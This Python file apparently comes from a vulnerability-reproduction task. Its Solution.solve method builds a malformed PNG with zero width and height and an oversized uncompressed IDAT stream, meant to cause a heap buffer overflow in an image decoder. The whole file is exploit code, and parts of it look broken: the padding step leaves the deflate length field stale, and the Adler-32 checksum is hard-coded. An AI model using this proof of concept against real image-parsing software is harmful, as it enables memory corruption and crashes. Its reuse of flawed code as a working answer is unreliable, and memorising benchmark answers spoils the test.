import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG with zero dimensions that triggers heap buffer overflow
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk - zero width and zero height
        ihdr_data = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk))
        ihdr = struct.pack('>I', len(ihdr_data)) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk - compressed image data that will overflow when dimensions are 0x0
        # Create deflate stream with uncompressed block containing data
        # This will trigger overflow when trying to allocate 0-sized buffer
        # but writing more data than allocated
        
        # Create uncompressed deflate block with max 65535 bytes
        # We'll create multiple IDAT chunks to reach target size
        target_size = 17814
        current_size = len(png_signature) + len(ihdr)
        
        # Calculate remaining bytes needed
        remaining = target_size - current_size - 12  # 12 for IEND
        
        # Create IDAT data that will cause overflow
        # The vulnerability: when width=0 and height=0, buffer allocation fails
        # but decompression still tries to write data
        
        # Create simple uncompressed deflate block
        # Maximum uncompressed block size is 65535
        block_size = min(65535, remaining - 6)  # 6 for deflate headers
        
        # Create deflate stream with uncompressed block
        # BFINAL=1, BTYPE=00 (no compression)
        deflate_header = b'\x01'  # BFINAL=1, BTYPE=00
        
        # Length and one's complement for uncompressed block
        length = block_size & 0xFFFF
        nlength = (~length) & 0xFFFF
        block_header = struct.pack('<HH', length, nlength)
        
        # Fill with pattern that might trigger edge cases
        # Using repeating pattern that could exploit overflow
        pattern = b'\x00' * 100 + b'\xFF' * 100 + b'\x00\xFF' * 50
        block_data = (pattern * (block_size // len(pattern) + 1))[:block_size]
        
        # Adler-32 checksum (for empty data or 0x0 image, should be 1)
        adler = struct.pack('>I', 1)
        
        idat_data = deflate_header + block_header + block_data + adler
        
        # Split into multiple IDAT chunks if needed
        idat_chunks = b''
        chunk_size = 8192  # Reasonable chunk size
        
        for i in range(0, len(idat_data), chunk_size):
            chunk = idat_data[i:i + chunk_size]
            idat_chunk = b'IDAT' + chunk
            idat_crc = struct.pack('>I', zlib.crc32(idat_chunk))
            idat_chunks += struct.pack('>I', len(chunk)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', zlib.crc32(b'IEND'))
        
        # Combine all parts
        poc = png_signature + ihdr + idat_chunks + iend
        
        # Ensure exact target size
        if len(poc) != target_size:
            # Adjust by padding IDAT data
            diff = target_size - len(poc)
            if diff > 0:
                # Add padding to last IDAT chunk by recreating with adjusted size
                # For simplicity, just add to block_data
                block_data += b'\x00' * diff
                idat_data = deflate_header + block_header + block_data + adler
                idat_chunk = b'IDAT' + idat_data
                idat_crc = struct.pack('>I', zlib.crc32(idat_chunk))
                idat_chunks = struct.pack('>I', len(idat_data)) + idat_chunk + idat_crc
                poc = png_signature + ihdr + idat_chunks + iend
        
        return poc[:target_size]